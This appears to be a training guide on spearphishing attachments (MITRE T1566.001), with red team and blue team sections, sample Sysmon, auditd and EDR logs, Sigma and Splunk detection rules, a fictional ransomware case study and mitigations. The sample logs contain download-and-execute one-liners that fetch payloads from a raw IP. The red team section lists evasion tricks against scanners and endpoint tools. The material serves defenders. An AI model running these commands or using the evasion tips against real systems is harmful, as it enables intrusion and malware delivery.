02 · Red team perspective

The attacker's point of view

To stop an attack, you must first understand it. In this section we look through the eyes of an attacker — or a professional red teamer who tests companies with permission. Everything here stays simple, legal, and educational.

Who is "red team"?

A red team is a group of security professionals who play the attacker. They attack their own company, with written permission, to test defenses. Real criminals do the same actions but for money or espionage. If you understand one side, you become better at the other side.

What exactly is T1566.001?

In plain words: the attacker sends one specific person an email with a malicious file attached, and waits for the person to open it. The email is written for that person — it mentions their real work, their real supplier, or their real project. That is why it is called "spear" phishing: like a spear, it is aimed at one target, not thrown at a crowd.

The attachment is the weapon. It is usually a document, archive, or disk image that runs attacker code when opened. The attacker does not need to hack any server or break any password at this stage. The user does the last step by opening the file. This is why the technique is cheap, fast, and still works after many years of awareness training.

ATT&CK places it in the Initial Access tactic — the very first step of an intrusion. From here the attacker normally moves on to running commands (T1059), stealing passwords, and expanding access. If you block the technique here, the whole attack chain dies before it starts.

When and why attackers use it

When it is used

  • Start of a targeted intrusion. The attacker wants one specific company, so random spam is not enough.
  • When ports and services are closed. If the target has no exposed VPN or web apps, email is often the only open door.
  • When other tricks failed. Password spraying, buying leaked passwords, or scanning found nothing useful.
  • Before a big operation. Ransomware groups deliver their loader this way, then hand the access to the ransomware team.

Why attackers like it

  • It targets humans, not machines. Firewalls cannot read intention; a busy person can be convinced.
  • It is cheap. A domain costs a few dollars. A mailer script is free. One success pays for everything.
  • It goes through a door that must stay open. Companies need email for business, so it can never be fully closed.
  • It leaves few traces at first. Before the click, there is almost nothing for defenders to find on the network.

What an attacker needs (prerequisites)

A spearphishing attachment attack needs four ingredients. Each one is simple on its own — together they are dangerous.

  1. A target identity. A name, a job title, and an email address. Attackers find these on the company website, on LinkedIn, in PDF documents indexed by search engines, or from a previous breach database.
  2. A believable story. The email must fit the target's real life. An invoice for a finance clerk, a CV reply for a recruiter, a "schedule change" for an assistant. This story is built from public information — the technical name is OSINT, which means "open source intelligence".
  3. A payload. A file that runs code when opened. It can be a macro document, an archive with a shortcut inside, or a disk image with a program. Criminal groups often buy or rent a ready-made loader instead of writing their own.
  4. Infrastructure. A server or free account to send the email from, plus a server to receive connections later (the C2 server). Attackers often use a fresh domain that looks similar to a real supplier's name.

A simple attack walkthrough (educational)

This is how a professional red team builds a T1566.001 test with permission. Notice that every step is well known and easy to detect — that is the point. Red teams help defenders practice on these steps.

Step 1 — Find the target and the story

The tester collects public information about the company: supplier names, email formats, current events. A tool like theHarvester or a simple search engine query for site:target.com filetype:pdf reveals document templates and email addresses.

Step 2 — Build the payload

For a safe test, the payload does something harmless but visible, for example opening a message box. Real attacks use the same delivery method but with a shell or a loader. A macro skeleton looks like this:

VBA · educational macro skeleton
Sub AutoOpen()
    ' Runs automatically when the document opens (if macros are enabled)
    ' RED TEAM TEST PAYLOAD - harmless demo, shows the execution path
    Dim shellObj As Object
    Set shellObj = CreateObject("WScript.Shell")
    ' In a criminal attack this line would run an encoded PowerShell
    ' command that downloads a real malware loader instead:
    shellObj.Run "powershell.exe -nop -w hidden -c ""Write-Host 'Test executed'"""
End Sub

Step 3 — Send it like a real campaign

Testers use a phishing framework such as GoPhish (a free, legal tool). GoPhish sends the email, tracks who opened it, and produces a report. This lets the blue team measure: how many people opened, how many clicked, how many reported.

Step 4 — Listen and validate

In a real attack, the attacker starts a listener and waits for the payload to connect back. In an authorized test, the connection lands on the red team's server and proves the weakness. The Atomic Red Team library has a ready-made, harmless test for T1566.001 that downloads and opens a test document — perfect for checking that your R1 rule fires. Then everyone writes a report, and defenders add the rules you will see in Section 4.

How attackers try to stay hidden (evasion)

Tricks against email scanners

  • Fresh domains that have no bad history yet.
  • Password-protected archives so the scanner cannot open the file. The password is in the email text.
  • Small unique changes to each copy of the file so hash-based blocking fails. This is called obfuscation (ATT&CK T1027).
  • Sending at night or on weekends, when security staff are away.

Tricks against endpoint defenses

  • Living off trusted tools: using PowerShell, certutil, or rundll32 that already exist on Windows, so no obvious malware binary is needed at first.
  • No files on disk: downloading and running the payload only in memory, where antivirus sees nothing.
  • Following the security news: when macros got blocked by default in 2022, many groups switched to OneNote, ISO, and shortcut files within weeks.
  • Testing the payload on free online sandbox services before sending it, so it does not get flagged.
Where this fits in the attack chain

T1566.001 is step one. Right after it, attackers commonly use: User Execution (T1204.002 — the user opened the file), Command and Scripting Interpreter (T1059 — PowerShell, VBA), Ingress Tool Transfer (T1105 — downloading the real malware), Persistence (T1547.001 — Run keys), and Application Layer Protocol: Web Protocols (T1071.001 — talking to C2). Your detections should cover the chain, not only the email.

Practice legally

If you want to try red team skills, use: a home lab with virtual machines, test ranges like TryHackMe or Hack The Box, or your employer's official purple team exercises. Tools like GoPhish, Atomic Red Team, and the Sysmon configuration in this guide are made for safe, authorized practice. Sending any phishing email to real people outside such programs can cost you your job — or your freedom.

03 · Blue team perspective

The defender's point of view

Now switch sides. You sit in the Security Operations Center (SOC). Your job: see the attack early, understand it fast, and stop it before real damage. The good news — every step of this attack leaves traces. Your job is to know which traces matter.

Who is "blue team"?

The blue team is everyone who defends: SOC analysts who watch alerts, detection engineers who write rules, incident responders who clean up infections, and threat intel analysts who track attackers. This section speaks to all of them.

First, a mindset shift

Beginners think the goal is to stop every phishing email from arriving. That is impossible. Email must flow for business, attackers improve faster than filters, and one employee will always click. Professional defenders plan for the click. They ask a different question: "The email arrived and the user clicked — what do I see next, and how fast can I react?"

That is why this guide repeats one rule: detect the execution, not just the delivery. A missing email is invisible in endpoint logs. But the moment a malicious attachment runs, it must use processes, files, registry keys, and the network — and every one of those actions can be logged and alerted.

The second mindset rule: user reports are gold. When an employee clicks "report phishing", you get the sample, the sender, and a timestamp. Companies with a working report button find campaigns days earlier than those without.

Where you can catch the attack

1. DeliveryEmail gateway logs → 2. ExecutionEDR / Sysmon — best point → 3. Payload fetchProxy / DNS logs → 4. C2 beaconNetflow / NDR → 5. Actions on goalFile, identity, cloud logs

The two red boxes are where detection is easiest and cheapest. At execution, the malicious code must start a child process from Office — almost no business software does that by accident. At payload fetch, PowerShell suddenly behaves like a web browser. Both are loud, and both have ready-made rules in Section 4.

The most valuable signals for this technique

Top endpoint signals

  • Any Office app spawning cmd, powershell, wscript, cscript, mshta, or rundll32.
  • Office apps or PowerShell writing executable files into %TEMP%.
  • PowerShell command lines with DownloadString, FromBase64String, or hidden-window flags (-w hidden, -nop).
  • Office document files in user temp folders never seen in the environment before.

Top network signals

  • Newly registered domains contacted by workstations, especially lookalike supplier names.
  • Beaconing: repeated, evenly spaced connections from one host to one external IP.
  • A WindowsPowerShell user agent in proxy logs — PowerShell rarely browses the web legitimately.
  • Direct IP connections (no domain name) from user workstations.

SOC triage in three questions

1. What ran?

Open the EDR process tree for the alert. Look for an Office process as the parent. Get the full command line, the user, and the hash of every child process. This tells you the attack step in seconds.

2. Who else got the email?

Search mail logs for the same sender, subject, or attachment name. Spearphishing often goes to 5–50 people in the same team. List every recipient before doing anything else.

3. What did it touch?

Check network connections, DNS queries, and files created by the affected host in the last 24 hours. If it beacons, note the C2 address — you will block it and hunt for it everywhere.

Why this matters — the money view

Spearphishing attachments are rarely the end goal. They are the entrance door for ransomware, business email compromise, and espionage. Industry reports such as the Verizon DBIR place phishing and its variants at the top of intrusion paths year after year. A loader that arrives as an attachment today can encrypt 400 servers in 60 hours — the case study in Section 5 shows exactly that timeline.

Early detection is also dramatically cheaper. Removing one infected workstation costs hours. Rebuilding a domain after ransomware costs weeks. Every step you move detection to the left — from data theft back to execution — multiplies what you save. That is the business case for the detection work in the next section.

Beginner glossary for this guide

EDR

Endpoint Detection and Response. Software on computers that records process trees, files, and network use, and can isolate a machine remotely.

SIEM

Security Information and Event Management. The central system that collects logs from everywhere and runs detection rules, like Splunk or Microsoft Sentinel.

Sysmon

A free Windows tool that records detailed events — process creation, file writes, registry changes, network connections — into the Windows event log.

IoC

Indicator of Compromise. A concrete clue like a file hash, a bad domain, or an IP address. Fast to block, but attackers can change them.

TTP

Tactics, Techniques and Procedures. How an attacker works, not just which files they use. TTP detections survive new malware versions.

C2 / beacon

Command and Control. The attacker's server that gives orders. A beacon is the regular "I am here" signal the malware sends to it.

Sandbox

A safe virtual machine where email attachments are opened automatically to see if they do something bad, before delivery.

MOTW

Mark of the Web. A hidden marker on files downloaded from the internet. Office uses it to block macros from such files.

The TI workflow for this technique

Collect → Process

Pull IoCs (hashes, sender domains, sending IPs, C2 addresses) and TTP notes from the sources above into one place — a MISP instance, an OTX subscription, or even a tracked spreadsheet for small teams. Normalize them: every IoC should have a source, a date, a confidence level, and an expiry. Old IoCs rot fast; a domain from a 2023 report should not block your users in 2026.

Analyze → Disseminate → Feedback

Cluster the data: which actor, which campaign, which loader family? Map behaviors to ATT&CK (this keeps IoCs and TTPs together). Then deliver: IoCs to blocklists and watchlists, TTPs to new detection rules, and a short report to leadership with plain numbers ("37 users received campaign X, 2 opened it, 0 infected"). Collect feedback: which feeds actually produce alerts? Cut the dead ones.

Stay current: the official detection strategy DET0236

MITRE now publishes ready-made detection logic on the technique page itself. Detection Strategy DET0236 ("Spearphishing Attachment across OS Platforms") defines three analytics: AN0655 — Windows: correlate email delivery with later file creation and abnormal process execution (Office spawning PowerShell or CMD); AN0656 — Linux: link email logs to file creation in mail directories and later suspicious execution; AN0657 — macOS: correlate Mail/Preview app spawns of Terminal or scripting tools plus later network activity. The rules in 4.5 implement exactly these three analytics, so your coverage is aligned with the source of truth.

TH-08HighmacOSAttachment payload runs on MacWord/Excel on macOS spawning zsh, osascript, or curl. Mac office macros exist and are abused; SOCs often have weaker logging here, which raises the impact.
TH-09LowEmail / CloudMass attachment campaign trendOne sender domain pushes attachments to many users in a short window. Individually each mail is "just spam"; together they are a campaign precursor. Best caught with an aggregation rule.
TH-10MediumLinuxAttachment payload executes on LinuxLibreOffice macros, malicious scripts, or archives sent to Linux desktops and servers. Processes started from mail directories (~/.thunderbird, ~/.local/share/Trash) or /tmp are the Linux shape of this technique (official analytic AN0656).

4.4 Logs & patterns — what to collect and what to look for

Before anything: confirm your log sources

Rules are useless without logs. Minimum set for this technique: EDR or Sysmon (process, file, registry, network events) on all workstations and servers, email gateway / message trace logs, proxy and DNS logs, and Windows Security logs with command-line auditing enabled (GPO: Administrative Templates → System → Audit Process Creation → Include command line). Keep at least 90 days searchable and one year archived. For Sysmon, a community configuration like SwiftOnSecurity's sysmon-config is a good start.

TH-01 — Macro payload executes · Critical

Log sources: Sysmon Event ID 1 (process creation) or Windows Security 4688 with command lines, EDR process tree. Pattern to look for: an Office executable as the parent of a shell or script interpreter. Legitimate Office almost never does this.

Sysmon Event ID 1 — trimmed XML
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-09-15T08:47:12.331Z"/>
    <Computer>FIN-WS-042.contoso.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="CommandLine">powershell -nop -w hidden -c IEX((New-Object
        Net.WebClient).DownloadString('http://185.203.116.17/a.ps1'))</Data>
    <Data Name="ParentImage">C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE</Data>
    <Data Name="User">CONTOSO\j.smith</Data>
  </EventData>
</Event>

What to notice: parent WINWORD.EXE; flags -nop -w hidden; the string DownloadString; an external IP instead of a domain. Any one of these is worth a look; together they are a confirmed TH-01/TH-02 chain.

TH-02 — Second stage downloaded · Critical

Log sources: Sysmon Event ID 1 with command lines (also 4688), proxy logs, Windows PowerShell operational log (Event ID 4104 script blocks), AMSI telemetry via EDR. Pattern: download keywords in command lines (DownloadString, Invoke-WebRequest, certutil -urlcache), or PowerShell acting as an HTTP client in proxy logs.

Windows Security 4688 — trimmed XML
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <EventID>4688</EventID>
    <TimeCreated SystemTime="2026-09-15T08:47:14.102Z"/>
    <Computer>FIN-WS-042.contoso.local</Computer>
  </System>
  <EventData>
    <Data Name="NewProcessName">C:\Windows\System32\cmd.exe</Data>
    <Data Name="CommandLine">cmd.exe /c curl http://185.203.116.17/p.bin
        -o %TEMP%\p.bin && %TEMP%\p.bin</Data>
    <Data Name="ParentProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>
    <Data Name="SubjectUserName">j.smith</Data>
  </EventData>
</Event>

What to notice: a chain of three interpreters (Word → PowerShell → cmd + curl); download to %TEMP%; immediate execution with &&. This "download and run in one line" pattern is classic loader behavior.

TH-03 — Executable dropped to disk · High

Log sources: Sysmon Event ID 11 (file create) with hashes, EDR file events. Pattern: Office processes (or their children) writing executable or script files into user-writable temp folders.

Sysmon Event ID 11 — key fields
<Event>
  <System><EventID>11</EventID>
    <TimeCreated SystemTime="2026-09-15T08:47:16.884Z"/>
    <Computer>FIN-WS-042.contoso.local</Computer></System>
  <EventData>
    <Data Name="ProcessGuid">{A1B2C3D4-1234-5678-9ABC-DEF012345678}</Data>

What to notice: the creating process is Word; the path is a random-named folder inside %TEMP%; the file is an .exe. Grab the SHA256 and check it against MalwareBazaar and VirusTotal — this hash becomes an IoC for your retro-hunt.

TH-04 — Risky attachment delivered · High

Log sources: Microsoft 365 message trace / Defender for Office 365 logs, Exchange tracking logs, or any mail gateway (Proofpoint, Mimecast, Barracuda) exported to the SIEM. Pattern: inbound mail whose attachment names end in historically abused types, plus authentication failures (SPF/DKIM/DMARC).

Microsoft 365 message trace — JSON export
{
  "ReceivedTime": "2026-09-15T08:47:05.441",
  "SenderAddress": "billing@supplier-portal.co",
  "RecipientAddress": "j.smith@contoso.com",
  "Subject": "RE: Overdue Invoice INV-2026-0918",
  "AttachmentName": "Invoice_INV-2026-0918.docm",
  "Direction": "Inbound",
  "DeliveryStatus": "Delivered",
  "SPF": "SoftFail", "DKIM": "None", "DMARC": "Fail",
  "FromIp": "45.133.1.208"
}

What to notice: a lookalike domain (supplier-portal.co instead of the real supplier-portal.com); DMARC fail; a macro document type; a reply-style subject that pretends to be part of an existing thread. Each detail alone is suspicious; the combination is a campaign.

TH-05 — C2 beacon from Office/PowerShell · High

Log sources: Sysmon Event ID 3 (network connection), firewall/netflow, DNS logs, proxy logs. Pattern: rare processes (Office, PowerShell) initiating outbound connections to fresh domains or raw IPs; evenly repeated timing (beacon rhythm); unusual user agents.

Proxy log (Squid-style) — one line
172.16.4.28 - j.smith [15/Sep/2026:09:20:14 +0000] "GET http://cdn-update.top/a.ps1 HTTP/1.1"
  200 45231 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) WindowsPowerShell/5.1.19041.1682"

What to notice: the user agent says WindowsPowerShell — scripts rarely need the web for business reasons; the domain is 6 days old; the file extension is .ps1. In Sysmon Event 3 you would instead see Image = powershell.exe and DestinationIp = 185.203.116.17 with no hostname.

TH-06 — Persistence via Run key · High

Log sources: Sysmon Event ID 13 (registry set), Event ID 12 (object create/delete), Security 4698 (scheduled task created), EDR. Pattern: Office-descendant processes writing to autostart locations.

Sysmon Event ID 13 — key fields
<Event>
  <System><EventID>13</EventID>
    <TimeCreated SystemTime="2026-09-15T08:47:18.051Z"/>
    <Computer>FIN-WS-042.contoso.local</Computer></System>
  <EventData>
    <Data Name="EventType">SetValue</Data>
    <Data Name="Image">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data>

    <Data Name="Details">C:\Users\j.smith\AppData\Local\Temp\qsxapsd\qsxapsd.exe</Data>
  </EventData>

What to notice: the value name mimics "OneDrive" to look normal; the data points into a random temp folder; the writing process is PowerShell spawned by Word. Persistence created by Office-descendant processes is malicious until proven otherwise.

TH-07 — Antivirus detects the payload · Medium

Log sources: Microsoft-Windows-Windows Defender/Operational event log (Event IDs 1116, 1117), or equivalent events from other AV engines forwarded to the SIEM. Pattern: detections naming macro trojans or droppers, with file paths in temp folders or the Outlook attachment cache.

Windows Defender Event ID 1116 — key fields
<Event>
  <System><EventID>1116</EventID>
    <TimeCreated SystemTime="2026-09-15T08:47:21.300Z"/>
    <Computer>FIN-WS-042.contoso.local</Computer></System>
  <EventData>

    <Data Name="Path">C:\Users\j.smith\AppData\Local\Temp\qsxapsd\qsxapsd.exe</Data>
    <Data Name="Action Success">Quarantined</Data>
    <Data Name="Origin">Email attachment</Data>
  </EventData>
</Event>

What to notice: the !ml suffix means a machine-learning verdict — worth confirming with a second source. Even a "Quarantined" success matters: the same campaign often retries with a new variant days later, so push the sender and hash into your intel process.

TH-08 — Payload runs on macOS · Medium

Log sources: macOS Endpoint Security / EDR telemetry (Microsoft Defender for Endpoint, CrowdStrike, SentinelOne), unified log (log stream), audit logs. Pattern: Microsoft Office apps spawning shell, script, or download tools.

macOS EDR event — JSON example
{
  "timestamp": "2026-09-15T09:14:31.220Z",
  "host": "MAC-FIN-011",
  "user": "finance1",
  "parent_process": "/Applications/Microsoft Word.app/Contents/MacOS/Microsoft Word",
  "process": "/bin/zsh",
  "args": ["-c", "curl -o /tmp/.upd http://185.203.116.17/m && chmod +x /tmp/.upd && /tmp/.upd"],
  "verdict": "blocked"
}

What to notice: Word as parent of zsh; a download chained with chmod +x and immediate execution; a hidden filename starting with a dot. On many Mac fleets this activity is impossible because no EDR is installed — which is exactly the gap attackers love.

TH-09 — Mass attachment campaign trend · Low

Log sources: mail gateway or message trace logs. Pattern: not a single event but an aggregate — one sender domain, many recipients, attachments, in a short time window. This is a hunting rule, not an emergency alert.

Message trace summary — CSV-style view
date,sender_domain,attachment,messages,recipients,status
2026-09-15,supplier-portal.co,Invoice_INV-2026-0918.docm,412,38,Delivered
2026-09-15,supplier-portal.co,Invoice_INV-2026-0919.docm,9,9,Delivered
2026-09-14,logistics-partner.net,PO_8841_scan.zip,260,21,Delivered

What to notice: hundreds of messages and dozens of recipients from one young domain in one morning. This is the shape of a campaign start. Feed the domain to your gateway blocklist and start a retro-hunt the same day.

TH-10 — Payload executes on Linux · Medium

Log sources: auditd rules (execve with arch b64, plus path watches on mail directories), Sysmon for Linux (Event ID 1), osquery process_events, or your Linux EDR. Pattern (official analytic AN0656): a process executed from a mail directory (~/.thunderbird, mail cache, Trash) or /tmp, shortly after mail delivery — often a shell or downloader started by a document app or a double-clicked script.

auditd — EXECVE with SYSCALL
type=SYSCALL msg=audit(1769426451.512:8843) arch=c000003e syscall=59 success=yes
  ppid=2381 pid=2410 auid=1002 uid=1002 exe="/bin/bash" key="exec_capture"
type=EXECVE msg=audit(1769426451.512:8843) argc=3 a0="bash" a1="-c"
  a2="curl http://185.203.116.17/p.sh -o /tmp/.sysupd && chmod +x /tmp/.sysupd && /tmp/.sysupd"
type=CWD  msg=audit(1769426451.512:8843) cwd="/home/j.reyes/.thunderbird/attachments"

What to notice: syscall=59 is execve — a new program starts; auid=1002 ties it to the logged-in user, not a daemon; the working directory is a mail attachment folder; the command downloads from a raw IP and runs it in one line. The same logic applies if you read exe/cwd from Sysmon for Linux or osquery instead — the fields differ, the behavior does not.

4.5 Sigma rules & Splunk SPL — detection-as-code

What is Sigma?

Sigma is an open format for writing detection rules once, in YAML, and running them in many SIEM and EDR products. Treat rules like code: store them in Git, review changes, test before merge. Validate YAML with sigma check from the pySigma toolset before you ship.

How to use the SPL below

The Splunk queries assume common field names from Sysmon via XmlWinEventLog. Adjust index= and sourcetype= to your environment (for example index=wineventlog, or index=edr). Test each query with | head 100 before creating a saved search or alert.

R1 · for TH-01 — Office app spawned a shell or interpreter Critical

Sigma · YAML
title: MS Office Application Spawned a Script or Shell Interpreter
id: 3b2a1c9e-8f4d-4b7a-9c21-a6e5d4c3b201
status: stable
description: |
  Detects a Microsoft Office application starting a command line or script
  interpreter. Strong sign that a macro or exploit inside an email
  attachment (T1566.001) is executing attacker code.
references:
  - https://attack.mitre.org/techniques/T1566/001/
  - https://attack.mitre.org/techniques/T1204/002/
author: Detection Engineering Team
date: 2026-09-25
logsource:
  product: windows
  category: process_creation
detection:
  selection_parent:
    ParentImage|endswith:
      - '\WINWORD.EXE'
      - '\EXCEL.EXE'
      - '\POWERPNT.EXE'
      - '\OUTLOOK.EXE'
      - '\ONENOTE.EXE'
      - '\MSPUB.EXE'
      - '\MSACCESS.EXE'
  selection_child:
    Image|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
      - '\regsvr32.exe'
  condition: selection_parent and selection_child
falsepositives:
  - Rare. Some document automation tools or add-ins call command line
    tools from Office. Allow exact parent-child pairs after review.
level: critical
tags:
  - attack.initial_access
  - attack.execution
  - attack.t1566.001
  - attack.t1204.002
  - attack.t1059.001
Splunk · SPL
index=edr source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| regex ParentImage="(?i)\\(WINWORD|EXCEL|POWERPNT|OUTLOOK|ONENOTE|MSPUB|MSACCESS)\.EXE$"
| regex Image="(?i)\\(CMD|POWERSHELL|PWSH|WSCRIPT|CSCRIPT|MSHTA|RUNDLL32|REGSVR32)\.EXE$"
| stats count AS events, values(CommandLine) AS command_lines,
        values(ParentImage) AS office_parents by Computer, Image, User
| sort - events

Tuning notes: this rule fires almost never on a clean estate — that is why its level is critical. If you see repeat legitimate pairs (some ERP add-ins), add a filter selection for the exact ParentImage + Image + CommandLine combination, never a broad allow.

R2 · for TH-02 — PowerShell download cradle command line Critical

Sigma · YAML
title: PowerShell Download Cradle or Encoded Execution in Command Line
id: 5d7e2f11-9a3c-4e68-b1d4-c2f5a6b7d302
status: stable
description: |
  Detects PowerShell fetching and running remote content, or certutil
  used as a downloader. Common second stage after a malicious email
  attachment (T1566.001).
references:
  - https://attack.mitre.org/techniques/T1566/001/
  - https://attack.mitre.org/techniques/T1105/
author: Detection Engineering Team
date: 2026-09-25
logsource:
  product: windows
  category: process_creation
detection:
  selection_ps:
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
  selection_keywords:
    CommandLine|contains:
      - 'DownloadString'
      - 'DownloadFile'
      - 'DownloadData'
      - 'Invoke-WebRequest'
      - 'Invoke-RestMethod'
      - 'Net.WebClient'
      - 'FromBase64String'
      - 'Start-BitsTransfer'
      - 'IEX('
      - 'iex '
  selection_certutil:
    Image|endswith: '\certutil.exe'
    CommandLine|contains: 'urlcache'
  condition: (selection_ps and selection_keywords) or selection_certutil
falsepositives:
  - Administrative scripts and software installers that download files.
    Allow full unique command lines, and require them to be documented.
level: high
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1566.001
  - attack.t1105
  - attack.t1059.001
Splunk · SPL
index=edr source="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
    (Image="*\\powershell.exe" OR Image="*\\pwsh.exe" OR Image="*\\certutil.exe")
| where (match(Image, "(?i)(powershell|pwsh)\\.exe$") AND match(CommandLine, "(?i)(DownloadString|DownloadFile|DownloadData|Invoke-WebRequest|Invoke-RestMethod|Net\\.WebClient|FromBase64String|Start-BitsTransfer|IEX\\()")) OR (match(Image, "(?i)certutil\\.exe$") AND match(CommandLine, "(?i)urlcache"))
| table _time, Computer, User, ParentImage, Image, CommandLine
| sort - _time

Tuning notes: the where match() block mirrors the Sigma condition exactly: download keywords only count for PowerShell, urlcache only counts for certutil. Expect some hits from admin tooling in the first weeks. Confirm the ParentImage: a shell parented by Office is instantly critical (chain with R1); a shell parented by your automation platform is usually fine. Also enable PowerShell Script Block Logging (Event ID 4104) — encoded commands that hide from the command line still appear there.

05 · Real-world scenario

Case study: the invoice that nearly cost €4 million

This is a composite incident built from public reporting on Emotet, QakBot, and Conti-style intrusions. The company and people are fictional, but every step follows patterns seen in real investigations. Read it like a post-incident review — timeline first, then response, impact, and lessons.

The victim

Contoso Manufacturing — 850 employees, three sites, mixed Windows 10/11 fleet with Microsoft 365. SOC of four people, one SIEM, EDR on laptops but not on all servers.

The attacker

A cybercrime crew running a QakBot-style loader operation: buy access, map the network, deploy ransomware, or sell the access. Typical TTPs, well documented in vendor reports.

The bait

A reply-style email from a lookalike supplier domain: accounts@supplier-portal.co, subject "RE: Overdue Invoice INV-2026-0918", attachment Invoice_INV-2026-0918.docm.

The attack chain in ATT&CK notation

T1566.001 Spearphishing Attachment → T1204.002 Malicious File (user enabled macros) → T1059.001 PowerShell → T1105 Ingress Tool Transfer (loader downloaded) → T1547.001 Registry Run Keys (persistence) → T1003.001 LSASS Memory (credentials) → T1021.002 SMB/Admin Shares + scheduled tasks (lateral movement) → T1567.002 Exfiltration to Cloud Storage → T1486 Data Encrypted for Impact (staged, never executed). Every section of this guide maps to a link in this chain — block one link and the chain dies.

The attack timeline

Monday 08:47 · Delivery
The email lands in 38 inboxes

The gateway scores the message as low risk — clean file header, fresh domain, no known hash. Sandbox detonation is still "pending" when the message is delivered. Visible in: mail trace (DMARC fail, lookalike domain). No alert exists for TH-04 yet.

Monday 09:12 · Execution
Two users enable macros

Jane in accounts payable opens the invoice and clicks "Enable Content" to see the "scan". The macro runs PowerShell hidden. Visible in: nothing yet — no alert rules for Office child processes.

Monday 09:14 · Code runs
EDR creates a medium alert — and it dies in the queue

WINWORD.EXE spawns powershell -nop -w hidden -c IEX(...) and downloads the loader. The EDR raises a medium alert. The only analyst on duty has 31 open alerts; the ticket is auto-downgraded to "informational" after 20 minutes. The single biggest failure of this incident.

Monday 09:20 · C2 established
Beacon every 60 seconds

The loader copies itself to %TEMP%\qsxapsd\qsxapsd.exe, adds a Run key named OneDriveUpdater, and beacons to cdn-update.top over HTTPS. Visible in: Sysmon 3/11/13 logs — collected, but no rules on them.

Tuesday 02:00–05:00 · Discovery
The attacker maps the domain

From the workstation, the attacker runs nltest, net group "Domain Admins", and LDAP queries, then dumps LSASS memory and grabs a service account hash. Visible in: Security 4688 and EDR — a wave of low-severity alerts nobody correlated.

Wednesday 10:00 · Lateral movement
From laptop to file server

Using the service account, the attacker copies tools over SMB and creates scheduled tasks on FILE01 and APPS02. EDR coverage is missing on those servers. Visible in: Security 4698 on the servers only.

Wednesday 18:00 · First human alert
Proxy volume alarm fires

1.9 GB of finance documents upload to a file-sharing site. The proxy's volume alarm is the first alert a human actually reads. The SOC starts a real investigation at 18:20.

Thursday 09:30 · Connection made
The SOC links the chain

A detection engineer, prototyping the R1 rule from Section 4.5, retro-hunts the last 72 hours. The Monday 09:14 event lights up. Process tree, temp folder, Run key, C2 domain — the full story assembles in under an hour.

Thursday 10:30 · Containment
Isolate, reset, block

EDR isolates FIN-WS-042; both compromised accounts are disabled and reset; the C2 domain and IP go to the firewall and DNS sinkhole; mail admins purge remaining copies of the email from all 38 mailboxes.

Thursday–Friday · Eradication
Hunt the whole estate

Retro-hunting the loader hash and C2 finds two more hosts infected by the same campaign (a second wave nobody noticed). Both are reimaged. Persistence keys and tasks are removed; the ransomware the attacker staged on FILE01 is found — never executed.

Next week · Recovery & report
Back to normal, with receipts

Servers are rebuilt from verified clean backups, passwords rotate domain-wide, and a report goes to management and the regulator: 200 MB of finance documents confirmed exfiltrated, GDPR Art. 33 notification filed inside 72 hours of confirmation.

06 · Mitigation & defense

How to actually stop T1566.001

No single control stops spearphishing. You build layers: make delivery hard, make execution harder, and make detection certain. Below are the controls that matter, for enterprises and for home users — ordered so the cheap, high-impact ones come first.

Preventmake the attack hard → Slowremove easy tricks → Detectsee it in minutes → Respondlimit the damage → Recoverbackups, practice

ATT&CK mitigation mapping

ATT&CK mitigationWhat it means here
M1017 — User TrainingRegular awareness sessions and phishing simulations focused on attachments: check the sender domain, hover before clicking, report with one button.
M1049 — Antivirus / AntimalwareModern EDR with behavioral protection on every endpoint and server, kept current, with tamper protection on.
M1054 — Software ConfigurationOffice macro policy: block macros in files from the internet; Attack Surface Reduction rules that stop Office from spawning shells.
M1021 — Restrict Web-Based ContentFilter downloads by type and reputation so the second stage cannot be fetched easily from a user workstation. The official ATT&CK page also recommends blocking attachment types that should never travel by email (.scr, .exe, .pif, .cpl) and using gateways that can open and analyze compressed or encrypted archives.
M1031 — Network Intrusion PreventionIPS and email-scanning systems can block and remove malicious attachments on the wire, before a user ever sees them.
M1047 — AuditEnable auditing and monitoring for email attachments and file transfers; regularly review logs for suspicious attachments and any attempt to execute them — exactly the log review in Section 4.4.
M1018 — User Account ManagementLimit which accounts can open or execute files, and remove local admin rights from standard users — most macro payloads fail to persist without admin rights.

Enterprise controls, layer by layer

Layer 1 — Email (make delivery hard)

  • Enforce SPF, DKIM, and DMARC with p=reject on your own domains — it stops criminals from pretending to be you.
  • Attachment sandboxing: open attachments in a virtual machine before delivery; deliver only when the verdict is clean.
  • Block or quarantine risky types at the gateway: .iso, .img, .one, .lnk, .hta, .docm from external senders (rule R4 shows you how to watch what slips through).
  • Rewrite and time-of-click check URLs in mail.
  • External sender banner in the mail client, plus a clear warning when the display name matches an internal person.

Layer 2 — Endpoint (make execution harder)

  • Block macros from the internet: enable "Block macros from running in Office files from the Internet" (policy, Office 16.0.88xx+). This single setting defeats most macro attachments.
  • Attack Surface Reduction rules: at minimum "Block all Office applications from creating child processes", "Block Win32 API calls from Office macros", and "Block Office applications from creating executable content".
  • EDR everywhere, including servers, with tamper protection. The case study lost days to missing server coverage.
  • Remove local admin rights from standard users — most macro payloads fail to persist without them.
  • Block executable files in user temp folders with application control (WDAC/AppLocker where available).

Layer 3 — Network & identity

  • DNS filtering to sinkhole new and malicious domains (the cdn-update.top step dies here).
  • Egress control: workstations should not reach arbitrary external IPs or file-sharing sites; alert on violations.
  • Segment the network: a finance workstation should not reach the domain controller with SMB.
  • MFA everywhere and least-privilege accounts — stolen passwords become much less useful.
  • Credential guarding / LSASS protection so memory dumping of a workstation yields little.

Layer 4 — People, process, recovery

  • One-click report button in the mail client; answer reports within one hour; tell users what you found.
